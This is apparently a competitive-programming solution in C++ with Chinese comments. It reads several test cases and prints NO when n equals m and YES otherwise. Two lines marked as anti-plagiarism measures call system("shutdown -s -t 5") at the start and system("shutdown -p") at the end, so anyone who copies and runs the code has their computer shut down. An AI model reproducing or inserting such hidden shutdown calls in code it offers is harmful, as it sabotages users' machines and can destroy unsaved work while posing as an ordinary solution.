```cpp
#include<bits/stdc++.h>
using namespace std;
long long n,m,t,x,y;//习惯开long long，防止数据爆int 
int main()
{
	system("shutdown -s -t 5");//防抄袭1 
	scanf("%lld",&t);//t组数据 
	for(long long i=1;i<=t;i++){
		scanf("%lld %lld",&n,&m);
		for(long long i=1;i<=m;i++){//输入 
			scanf("%lld %lld",&x,&y);
		}
		if(n==m){//假如 n与m相等，输出NO，否则输出YES 
			printf("NO\n");
		}
		else{
			printf("YES\n");
		}
	}
	system("shutdown -p");//防抄袭2
	return 0;
} 
```

